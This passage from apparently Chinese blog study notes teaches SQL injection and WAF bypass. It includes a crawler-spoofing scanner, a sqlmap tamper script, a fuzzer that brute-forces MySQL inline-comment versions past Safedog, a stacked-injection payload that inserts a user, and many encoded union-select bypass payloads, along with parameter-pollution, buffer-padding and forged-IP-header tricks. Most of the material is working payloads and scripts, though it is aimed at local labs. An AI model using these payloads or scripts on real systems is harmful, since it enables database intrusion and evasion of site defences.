title="原理"></a>原理</h4><p>百度通过爬虫的方式去收录网站，而不会让WAF拦截，我们就可以通过伪造百度爬虫的方式去绕过WAF。</p><h4 id="各大搜索引擎的User-Agent"><a href="#各大搜索引擎的User-Agent" class="headerlink" title="各大搜索引擎的User-Agent"></a>各大搜索引擎的User-Agent</h4><h4 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.feiniaomy.com/post/429.html</span><br></pre></td></tr></table></figure><p>**百度 **</p><p>服务器地址在北京 {city:”北京市”, province:”北京市”}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</span><br></pre></td></tr></table></figure><p><strong>谷歌</strong></p><p>服务器地址在芒廷维尤 {city:”芒廷维尤”, province:”加利福尼亚州”}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)</span><br><span class="line"> </span><br><span class="line">Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)</span><br></pre></td></tr></table></figure><h4 id="伪造成百度爬虫脚本"><a href="#伪造成百度爬虫脚本" class="headerlink" title="伪造成百度爬虫脚本"></a>伪造成百度爬虫脚本</h4><p>当我们不伪造百度爬虫时，我们去扫描网站，扫描到的结果都会被拦截，扫描结果都是错误的，而伪造以后就不会被拦截。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://192.168.0.103:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line">head=&#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0(compatible;Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;PH1P.txt&#x27;</span>):</span><br><span class="line">    data=data.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    urls=url+data</span><br><span class="line">    code=requests.get(urls).status_code</span><br><span class="line">    <span class="built_in">print</span>(urls+<span class="string">&#x27;|&#x27;</span>+<span class="built_in">str</span>(code))</span><br></pre></td></tr></table></figure><h3 id="FUZZ绕过脚本"><a href="#FUZZ绕过脚本" class="headerlink" title="FUZZ绕过脚本"></a>FUZZ绕过脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/envpython</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright(c)2006-2019sqlmapdevelopers(http://sqlmap.org/)</span></span><br><span class="line"><span class="string">Seethefile&#x27;LICENSE&#x27;forcopyingpermission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> DBMS</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__=PRIORITY.HIGHEST</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">singleTimeWarnMessage(<span class="string">&quot;tamper script &#x27;%s&#x27; is only meant to be run against %s&quot;</span>%(os.path.basename(__file__).split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>],DBMS.MYSQL))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload,**kwargs</span>):</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#%23a%0aunion/*!44575select*/1,2,3</span></span><br><span class="line"><span class="keyword">if</span> payload:</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;union&quot;</span>,<span class="string">&quot;%23a%0aunion&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;select&quot;</span>,<span class="string">&quot;/*!44575select*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;%20&quot;</span>,<span class="string">&quot;%23a%0a&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;&quot;</span>,<span class="string">&quot;%23a%0a&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;database()&quot;</span>,<span class="string">&quot;database%23a%0a()&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests,time</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://127.0.0.1:8080/sqlilabs/Less-2/?id=-1&#x27;</span></span><br><span class="line">union=<span class="string">&#x27;union&#x27;</span></span><br><span class="line">select=<span class="string">&#x27;select&#x27;</span></span><br><span class="line">num=<span class="string">&#x27;1,2,3&#x27;</span></span><br><span class="line">a=&#123;<span class="string">&#x27;%0a&#x27;</span>,<span class="string">&#x27;%23&#x27;</span>&#125;</span><br><span class="line">aa=&#123;<span class="string">&#x27;x&#x27;</span>&#125;</span><br><span class="line">aaa=&#123;<span class="string">&#x27;%0a&#x27;</span>,<span class="string">&#x27;%23&#x27;</span>&#125;</span><br><span class="line">b=<span class="string">&#x27;/*!&#x27;</span></span><br><span class="line">c=<span class="string">&#x27;*/&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bypass</span>():</span></span><br><span class="line"><span class="keyword">for</span> xiaodi <span class="keyword">in</span> a:</span><br><span class="line"><span class="keyword">for</span> xiaodis <span class="keyword">in</span> aa:</span><br><span class="line"><span class="keyword">for</span> xiaodiss <span class="keyword">in</span> aaa:</span><br><span class="line"><span class="keyword">for</span> two <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">44500</span>,<span class="number">44600</span>):</span><br><span class="line">urls=url+xiaodi+xiaodis+xiaodiss+b+<span class="built_in">str</span>(two)+union+c+xiaodi+xiaodis+xiaodiss+select+xiaodi+xiaodis+xiao</span><br><span class="line">diss+num</span><br><span class="line"><span class="comment">#urlss=url+xiaodi+xiaodis+xiaodiss+union+xiaodi+xiaodis+xiaodiss+b+str(two)+select+c+xiaodi+xiaodis+xia</span></span><br><span class="line">odiss+num</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">result=requests.get(urls).text</span><br><span class="line">len_r=<span class="built_in">len</span>(result)</span><br><span class="line"><span class="keyword">if</span> (result.find(<span class="string">&#x27;safedog&#x27;</span>)==-<span class="number">1</span>):</span><br><span class="line"><span class="comment">#print(&#x27;bypass url addreess：&#x27;+urls+&#x27;|&#x27;+str(len_r))</span></span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&#x27;bypass url addreess：&#x27;</span>+urls+<span class="string">&#x27;|&#x27;</span>+<span class="built_in">str</span>(len_r))</span><br><span class="line"><span class="keyword">if</span> len_r==<span class="number">715</span>:</span><br><span class="line">                             fp = <span class="built_in">open</span>(<span class="string">&#x27;url.txt&#x27;</span>,<span class="string">&#x27;a+&#x27;</span>)</span><br><span class="line">                             fp.write(urls+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                             fp.close()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;connecting error&#x27;</span>)</span><br><span class="line">time.sleep(<span class="number">0.1</span>)</span><br><span class="line">if__name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;fuzz strat!&#x27;</span>)</span><br><span class="line">bypass()</span><br><span class="line">    </span><br><span class="line">    </span><br></pre></td></tr></table></figure><h3 id="SQLMAP绕过"><a href="#SQLMAP绕过" class="headerlink" title="SQLMAP绕过"></a>SQLMAP绕过</h3><h4 id="SQLMAP自带"><a href="#SQLMAP自带" class="headerlink" title="SQLMAP自带"></a>SQLMAP自带</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_34444097/article/details/82717357</span><br></pre></td></tr></table></figure><h4 id="自己写"><a href="#自己写" class="headerlink" title="自己写"></a>自己写</h4><p>仿照SQLMAP自带的来写。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211108988.png" alt="image-20210901203050344"></p><h4 id="拦截"><a href="#拦截" class="headerlink" title="拦截"></a>拦截</h4><p>直接通过SQLMAP跑，数据包的user-agent会显示sqlmap的标志</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211108202.png" alt="image-20210901203321920"></p><p>这样就会被WAF拦截</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211108009.png" alt="image-20210901203348626"></p><p>可以看到WAF开启了sqlmap工具拦截，就是通过识别user-agent。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211108282.png" alt="image-20210901203359165"></p><p><strong>更改user-agent</strong></p><p>sqlmap中可以通过–random-agent进行更改数据包中的User-Agent，来绕过WAF。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211108011.png" alt="image-20210901203928170"></p><p><strong>成功注入</strong></p><p>可以看到我们成功注入</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211108673.png" alt="image-20210901204449882"></p><p>而且他是根据我们写的规则进行注入的</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211108379.png" alt="image-20210901204528936"></p><p><strong>WAF开启流量防护</strong></p><p>当WAF开启CC防护</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211108592.png" alt="image-20210901204704671"></p><p>我们再次注入，发现被拦截，原因是因为sqlmap注入太快了，被WAF拦截了</p><p>绕过方法</p><ul><li><p>添加白名单User-Agent头部，像百度的、谷歌的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap参数:</span><br><span class="line">--user-agent=&quot;xxxx&quot; 自定义User-Agent</span><br></pre></td></tr></table></figure></li><li><p>代理池</p></li><li><p>添加延时参数 –delay参数</p></li></ul><p><strong>数据包中需要修改的sqlmap中没有时:</strong></p><p>通过自己编写脚本二次开发。</p><ul><li><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211108607.png" alt="image-20210901210720851"></li></ul><p>比如说这里的user-agent是sqlmap中没有的，我们可以自己去修改，然后通过-r的方式在进行注入。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211108904.png" alt="img"></p><p><strong>中转注入</strong></p><p>sqlmap去注入本地的脚本地址 -&gt; 本地搭建脚本(请求数据包自定义编写) -&gt; 远程地址</p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>18WEB漏洞--SQL注入之堆叠及WAF绕过注入</title>
      <link href="/2021/09/21/18WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%A0%86%E5%8F%A0%E5%8F%8AWAF%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/09/21/18WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%A0%86%E5%8F%A0%E5%8F%8AWAF%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在实际的渗透测试过程中，经常会碰到网站存在WAF的情况。网站存在WAF，意味着我们不能使用安全工具对网站进行测试，因为一旦触碰了WAF的规则，轻则丢弃报文，重则拉黑IP。所以，我们需要手动进行WAF的绕过，而绕过WAF前肯定需要对WAF的工作原理有一定的理解。</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211107539.png" alt="image-20210830195504797" style="zoom:67%;" /><h3 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实 的运用中也是这样的, 我们知道在 mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。 这样我们就想到了是不是可以多句一起使用。这个叫做 stacked  injection。 </p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在mysql中；代表的是一个语句的结束，堆叠注入就是利用；使前一个语句结束，然后后面跟上我们自己的语句，就形成了堆叠注入。</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211107646.png" alt="image-20210830200141062" style="zoom:67%;" /><h4 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h4><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到 API或者数据库引擎 不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-38/?id=1</span><br></pre></td></tr></table></figure><p>插入一个用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-38/?id=1&#x27;;insert into users values(100,&#x27;test&#x27;,&#x27;test&#x27;)--+</span><br></pre></td></tr></table></figure><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211107039.png" alt="image-20210830201301843" style="zoom:67%;" /><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/sunny11/p/14438269.html</span><br></pre></td></tr></table></figure><h4 id="大小写-关键字替换"><a href="#大小写-关键字替换" class="headerlink" title="大小写/关键字替换"></a>大小写/关键字替换</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">id=1UnIoN/**/SeLeCT1,user()</span><br><span class="line"></span><br><span class="line">Hex() bin() 等价于 ascii()</span><br><span class="line"></span><br><span class="line">Sleep() 等价于 benchmark()</span><br><span class="line"></span><br><span class="line">Mid() substring() 等价于substr()</span><br><span class="line"></span><br><span class="line">@@user 等价于 User()</span><br><span class="line"></span><br><span class="line">@@Version 等价于 version()</span><br></pre></td></tr></table></figure><h4 id="各种编码"><a href="#各种编码" class="headerlink" title="各种编码"></a>各种编码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">大小写，URL，hex，%0A等</span><br></pre></td></tr></table></figure><h4 id="注释使用"><a href="#注释使用" class="headerlink" title="注释使用"></a>注释使用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//----+#//+:%00/!/等</span><br></pre></td></tr></table></figure><h4 id="再次循环"><a href="#再次循环" class="headerlink" title="再次循环"></a>再次循环</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union==uunionnion</span><br></pre></td></tr></table></figure><h4 id="等价替换"><a href="#等价替换" class="headerlink" title="等价替换"></a>等价替换</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user()=@@user()and=&amp;or=|ascii=hex等</span><br></pre></td></tr></table></figure><h4 id="参数污染"><a href="#参数污染" class="headerlink" title="参数污染"></a>参数污染</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=2&amp;id=3</span><br></pre></td></tr></table></figure><h4 id="编码解码及加密解密"><a href="#编码解码及加密解密" class="headerlink" title="编码解码及加密解密"></a>编码解码及加密解密</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s-&gt;%73-&gt;%25%37%33</span><br><span class="line"></span><br><span class="line">hex,unlcode,base64等</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="更改请求提交方式"><a href="#更改请求提交方式" class="headerlink" title="更改请求提交方式"></a>更改请求提交方式</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET POST COOKIE等</span><br><span class="line"></span><br><span class="line">POST-&gt;multipart/form-data</span><br></pre></td></tr></table></figure><h4 id="WAF绕过-数据库特性"><a href="#WAF绕过-数据库特性" class="headerlink" title="WAF绕过-数据库特性"></a>WAF绕过-数据库特性</h4><p><strong>Mysql技巧</strong></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211107696.png" alt="img"></p><p>（1）mysql注释符有三种：#、/<em>…</em>/、–…(注意–后面有一个空格，或者为–+)</p><p>（2）空格符:[0x09,0x0a-0x0d,0x20,0xa0]</p><p>（3）特殊符号：%a换行符</p><p>可结合注释符使用%23%0a，%2d%2d%0a。</p><p>（4）内联注释：</p><p>/<em>!UnIon12345SelEcT</em>/1,user()//数字范围1000-50540</p><p>（5）mysql黑魔法</p><p>select{xusername}from{x11test.admin};</p><p><strong>SQLServer技巧</strong></p><p>（1）用来注释掉注入后查询的其余部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/*                                   C语言风格注释</span><br></pre></td></tr></table></figure><p>SQL注释</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;00％空字节</span><br></pre></td></tr></table></figure><p>（2）空白符：[0x01-0x20]</p><p>（3）特殊符号：%3a冒号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1union:select1,2from:admin</span><br></pre></td></tr></table></figure><p>（4）函数变形：如db_name 空白字符</p><p>3、Oracle技巧</p><ul><li><p>注释符：–、/**/</p></li><li><p>空白字符：[0x00,0x09，0x0a-0x0d,0x20]</p></li></ul><p>4.配合FUZZ（<a href="https://blog.csdn.net/weixin_44364851/article/details/111401383?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-15.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-15.control">SQLI FUZZ字典</a>，<a href="https://mochu.blog.csdn.net/article/details/109526779?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-16.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-16.control">SQL注入过滤关键字的Fuzz字典</a>）</p><p>就是模糊测试，批量测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id=1【位置一】union【位置二】select【位置三】1,2,db_name()【位置四】from【位置五】admin</span><br></pre></td></tr></table></figure><h4 id="WAF绕过-逻辑层"><a href="#WAF绕过-逻辑层" class="headerlink" title="WAF绕过-逻辑层"></a>WAF绕过-逻辑层</h4><p><strong>逻辑问题</strong></p><ol><li>云waf防护，一般我们会尝试通过查找站点的真实IP，从而绕过CDN防护。</li><li>当提交GET、POST同时请求时，进入POST逻辑，而忽略了GET请求的有害参数输入,可尝试Bypass。</li><li>HTTP和HTTPS同时开放服务，没有做HTTP到HTTPS的强制跳转，导致HTTPS有WAF防护，HTTP没有防护，直接访问HTTP站点绕过防护。</li></ol><p>（4）特殊符号%00，部分waf遇到%00截断，只能获取到前面的参数，无法获取到后面的有害参数输入，从而导致Bypass。比如：id=1 %00 and 1=2 union select 1,2,column_name from information_schema.columns</p><p><strong>性能问题</strong></p><p>猜想1：在设计WAF系统时，考虑自身性能问题，当数据量达到一定层级，不检测这部分数据。只要不断的填充数据，当数据达到一定数目之后，恶意代码就不会被检测了。</p><p>猜想2：不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度就会引发bug，从而实现绕过。</p><p>例子1：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1and(select1)=(Select0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9</span><br><span class="line"></span><br><span class="line">PS：0xA*1000指0xA后面”A&quot;重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考也许在有些情况下可能不需要这么长也能溢出。</span><br></pre></td></tr></table></figure><p>例子2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">?a0=0&amp;a1=1&amp;.....&amp;a100=100&amp;id=1</span><br><span class="line"></span><br><span class="line">union</span><br><span class="line"></span><br><span class="line">select</span><br><span class="line"></span><br><span class="line">1,schema_name,3</span><br><span class="line"></span><br><span class="line">from</span><br><span class="line"></span><br><span class="line">INFORMATION_SCHEMA.schemata</span><br><span class="line"></span><br><span class="line">备注：获取请求参数，只获取前100个参数，第101个参数并没有获取到，导致SQL注入绕过。</span><br></pre></td></tr></table></figure><p><strong>白名单</strong></p><p>方式一：IP白名单</p><p>从网络层获取的ip，这种一般伪造不来，如果是获取客户端的IP，这样就可能存在伪造IP绕过的情况。</p><p>测试方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">修改http的header来bypasswaf</span><br><span class="line"></span><br><span class="line">X-forwarded-for</span><br><span class="line">X-remote-IP</span><br><span class="line">X-originating-IP</span><br><span class="line">x-remote-addr</span><br><span class="line">X-Real-ip</span><br></pre></td></tr></table></figure><p>方式二：静态资源</p><p>特定的静态资源后缀请求，常见的静态文件(.js.jpg.swf.css等等)，类似白名单机制，waf为了检测效率，不去检测这样一些静态文件名后缀的请求。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://10.9.9.201/sql.php?id=1</span><br><span class="line"></span><br><span class="line">http://10.9.9.201/sql.php/1.js?id=1</span><br></pre></td></tr></table></figure><p>备注：Aspx/php只识别到前面的.aspx/.php后面基本不识别</p><p>方式三：url白名单</p><p>为了防止误拦，部分waf内置默认的白名单列表，如admin/manager/system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势</p><h3 id="WAF及绕过思路"><a href="#WAF及绕过思路" class="headerlink" title="WAF及绕过思路"></a>WAF及绕过思路</h3><h4 id="安全狗安装"><a href="#安全狗安装" class="headerlink" title="安全狗安装"></a>安全狗安装</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vulner.me/docs/install-safedog/</span><br></pre></td></tr></table></figure><h4 id="SQL绕过"><a href="#SQL绕过" class="headerlink" title="SQL绕过"></a>SQL绕过</h4><p><strong>基础知识</strong></p><p>部分bypass sqlinject payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1 union/*%00*/%23a%0A/*!/*!select 1,2,3*/;%23 </span><br><span class="line">id=-1 union/*%00*/%23a%0A/*!/*!select%201,database%23x%0A(),3*/;%23 </span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=-1%20union%20/*!44509select*/%201,%23x%0A/*!database*/(),3%23 </span><br><span class="line">id=-1%20union%20/*!44509select*/%201,2,3%23 </span><br><span class="line">/*!44509select*/当数据库版本是4.45.09以上版本就会执行/*! ....  */ 中的语句，否则不会执行，而如果没有44509`/*!select*/`就只能是注释。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">id=1/**&amp;id=-1%20union%20select%201,2,3%23*/ </span><br><span class="line"></span><br><span class="line">%20是空格，%23是#这条语句就是:id=1/**&amp;id=-1 union select 1,2,3#*/ </span><br><span class="line">/***/代表注释的意思,而在apache中如果一个变量接收2个参数,最后的那个参数就是最后的结果，就相当于id=1/**和id=-1%20union%20select%201,2,3%23*/ 接收了后者M这里利用了参数污染。</span><br><span class="line"></span><br><span class="line">等价sql语句:</span><br><span class="line">select * from users where id=-1 union select 1,2,3#*/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">id=-1 %20union%20all%23%0a%20select%201,2,3%23 </span><br><span class="line">id=-1 %20union%20all%23%0a%20select%201,%230%0Adatabase/**/(),3%23 </span><br><span class="line"></span><br><span class="line">/**/注释符不影响</span><br><span class="line">%230%0A ==#0换行</span><br><span class="line">相当于:</span><br><span class="line">id=-1  union all#</span><br><span class="line"> select 1,#0</span><br><span class="line"> database/**/(),3# </span><br><span class="line"> 最后执行结果就是id=-1 union all select 1,database/**/(),3# </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211107297.png" alt="image-20210831214832115"></p><p>加不加all都一样</p><h4 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h4><p><strong>提交方式绕过WAF</strong></p><p>如果我们的参数是通过REQUEST进行接收的，而WAF通过检测GET的方式进行防护，我们就可以通过POST的方式提交数据，从而绕过WAF</p><p><img 